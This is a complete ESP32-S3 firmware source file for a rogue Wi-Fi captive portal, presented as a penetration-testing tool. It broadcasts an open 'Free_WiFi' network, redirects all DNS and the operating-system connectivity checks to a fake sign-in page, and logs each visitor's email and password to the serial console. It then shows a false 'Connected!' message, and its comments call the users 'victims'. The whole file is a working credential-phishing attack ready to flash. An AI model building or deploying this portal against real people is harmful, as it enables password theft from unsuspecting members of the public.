// ============================================================================
// ESP32-S3 Captive Portal - Standalone Version
// ============================================================================
// 
// A simple captive portal for security research and penetration testing.
// Works independently - no Flipper Zero or external controller needed.
//
// SETUP:
//   Board: ESP32S3 Dev Module
//   ESP32 Core: 2.0.x (NOT 3.x)
//   USB CDC On Boot: Enabled
//
// LIBRARIES NEEDED:
//   - AsyncTCP (github.com/mathieucarbou/AsyncTCP)
//   - ESPAsyncWebServer (github.com/mathieucarbou/ESPAsyncWebServer)
//
// ============================================================================

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// ============================================================================
// CONFIGURATION - Change these to customize your portal
// ============================================================================

const char* WIFI_SSID = "Free_WiFi";   // Network name victims will see
const char* WIFI_PASS = "";             // Leave empty for open network

// IP Configuration
// Using 4.3.2.1 enables Samsung auto-popup but breaks USB serial (see docs)
// Using 192.168.4.1 keeps serial working but Samsung needs manual popup
IPAddress apIP(4, 3, 2, 1);
IPAddress netMsk(255, 255, 255, 0);

// LED Pins (Electronic Cats WiFi Dev Board)
// Set to -1 if your board doesn't have RGB LED
#define LED_ACCENT_PIN 4   // Blue
#define LED_STATUS_PIN 5   // Green  
#define LED_ALERT_PIN  6   // Red

// ============================================================================
// HTML TEMPLATE - Customize the login page here
// ============================================================================

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>WiFi Login</title>
    <style>
        * { 
            box-sizing: border-box; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
        }
        body { 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        h1 { 
            margin: 0 0 10px 0; 
            color: #333;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin: 0 0 30px 0;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="email"], 
        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e1e1;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        .success {
            display: none;
            text-align: center;
        }
        .success.show {
            display: block;
        }
        .success h2 {
            color: #10b981;
            font-size: 48px;
            margin: 0;
        }
        .form-container.hide {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container" id="formContainer">
            <h1>🌐 Free WiFi</h1>
            <p class="subtitle">Sign in to connect to the internet</p>
            
            <form id="loginForm">
                <div class="input-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="your@email.com" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter any password" required>
                </div>
                <button type="submit">Connect to WiFi</button>
            </form>
            
            <div class="footer">
                By connecting, you agree to our Terms of Service
            </div>
        </div>
        
        <div class="success" id="successMsg">
            <h2>✓</h2>
            <h3>Connected!</h3>
            <p>You now have internet access.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Send credentials to server
            var formData = new FormData(this);
            var params = new URLSearchParams(formData).toString();
            
            // Use image request (works even if fetch is blocked)
            var img = new Image();
            img.src = '/get?' + params;
            
            // Show success message
            document.getElementById('formContainer').classList.add('hide');
            document.getElementById('successMsg').classList.add('show');
        });
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// GLOBALS
// ============================================================================

AsyncWebServer server(80);
DNSServer dnsServer;
int captureCount = 0;

// ============================================================================
// LED FUNCTIONS
// ============================================================================

void setupLED() {
    if (LED_ACCENT_PIN >= 0) pinMode(LED_ACCENT_PIN, OUTPUT);
    if (LED_STATUS_PIN >= 0) pinMode(LED_STATUS_PIN, OUTPUT);
    if (LED_ALERT_PIN >= 0) pinMode(LED_ALERT_PIN, OUTPUT);
}

void setLED(bool accent, bool status, bool alert) {
    // LEDs are active LOW on Electronic Cats board
    if (LED_ACCENT_PIN >= 0) digitalWrite(LED_ACCENT_PIN, accent ? LOW : HIGH);
    if (LED_STATUS_PIN >= 0) digitalWrite(LED_STATUS_PIN, status ? LOW : HIGH);
    if (LED_ALERT_PIN >= 0) digitalWrite(LED_ALERT_PIN, alert ? LOW : HIGH);
}

void ledStarting() { setLED(true, false, false); }   // Blue
void ledReady()    { setLED(false, true, false); }   // Green
void ledCapture()  { setLED(false, false, true); }   // Red

void blinkAlert(int times) {
    for (int i = 0; i < times; i++) {
        ledCapture();
        delay(200);
        ledReady();
        delay(200);
    }
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

String escapeJson(String input) {
    String output = "";
    for (unsigned int i = 0; i < input.length(); i++) {
        char c = input.charAt(i);
        switch (c) {
            case '\\': output += "\\\\"; break;
            case '"':  output += "\\\""; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:   output += c;
        }
    }
    return output;
}

// ============================================================================
// CAPTIVE PORTAL HANDLER
// ============================================================================

class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request) {
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    }
};

// ============================================================================
// CREDENTIAL CAPTURE
// ============================================================================

void handleCredentials(AsyncWebServerRequest *request) {
    String email = "";
    String password = "";
    
    // Try different parameter names (forms use various conventions)
    if (request->hasParam("email")) {
        email = request->getParam("email")->value();
    } else if (request->hasParam("username")) {
        email = request->getParam("username")->value();
    } else if (request->hasParam("user")) {
        email = request->getParam("user")->value();
    } else if (request->hasParam("login")) {
        email = request->getParam("login")->value();
    }
    
    if (request->hasParam("password")) {
        password = request->getParam("password")->value();
    } else if (request->hasParam("pass")) {
        password = request->getParam("pass")->value();
    } else if (request->hasParam("pwd")) {
        password = request->getParam("pwd")->value();
    }
    
    // Only log if we got something
    if (email.length() > 0 || password.length() > 0) {
        captureCount++;
        
        // Human-readable output
        Serial.println();
        Serial.println("╔══════════════════════════════════════╗");
        Serial.println("║      CREDENTIALS CAPTURED!           ║");
        Serial.println("╠══════════════════════════════════════╣");
        Serial.print("║ Email:    ");
        Serial.println(email);
        Serial.print("║ Password: ");
        Serial.println(password);
        Serial.print("║ Count:    #");
        Serial.println(captureCount);
        Serial.println("╚══════════════════════════════════════╝");
        
        // JSON output for parsing
        String json = "{";
        json += "\"id\":" + String(captureCount) + ",";
        json += "\"email\":\"" + escapeJson(email) + "\",";
        json += "\"password\":\"" + escapeJson(password) + "\",";
        json += "\"ssid\":\"" + String(WIFI_SSID) + "\",";
        json += "\"timestamp\":" + String(millis());
        json += "}";
        Serial.println(json);
        Serial.println();
        
        // Visual feedback
        blinkAlert(3);
    }
    
    // Return a 1x1 transparent GIF (the form uses Image() to submit)
    const uint8_t gif[] = {
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
        0x00, 0x02, 0x01, 0x44, 0x00, 0x3b
    };
    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/gif", gif, sizeof(gif));
    request->send(response);
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
    // Initialize LED
    setupLED();
    ledStarting();
    
    // Initialize Serial
    Serial.begin(115200);
    delay(1000);
    
    // Welcome message
    Serial.println();
    Serial.println("╔══════════════════════════════════════╗");
    Serial.println("║   ESP32-S3 Captive Portal v1.0       ║");
    Serial.println("║   github.com/[your-username]/repo    ║");
    Serial.println("╚══════════════════════════════════════╝");
    Serial.println();
    
    // Configure WiFi AP
    Serial.println("[*] Configuring WiFi Access Point...");
    
    WiFi.disconnect();
    delay(100);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(100);
    
    // Set custom IP (note: this may break serial on ESP32-S3, see docs)
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    
    WiFi.softAP(WIFI_SSID, WIFI_PASS);
    delay(100);
    
    Serial.print("[+] SSID: ");
    Serial.println(WIFI_SSID);
    Serial.print("[+] IP:   ");
    Serial.println(WiFi.softAPIP());
    Serial.println();
    
    // Setup web server routes
    Serial.println("[*] Setting up web server...");
    
    // Main page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        Serial.println("[>] Client requested main page");
        request->send_P(200, "text/html", index_html);
    });
    
    // Credential capture endpoint
    server.on("/get", HTTP_GET, handleCredentials);
    
    // Captive portal detection endpoints
    // Android
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // iOS
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Windows
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // Firefox
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    // DNS server - redirect all domains to our IP
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    
    // Catch-all handler for any other requests
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    
    // Start server
    server.begin();
    
    Serial.println("[+] Web server started");
    Serial.println("[+] DNS server started");
    Serial.println();
    Serial.println("══════════════════════════════════════");
    Serial.println("   Portal is READY - Waiting for");
    Serial.println("   victims to connect...");
    Serial.println("══════════════════════════════════════");
    Serial.println();
    
    // Ready!
    ledReady();
}

// ============================================================================
// MAIN LOOP
// ============================================================================

void loop() {
    dnsServer.processNextRequest();
}
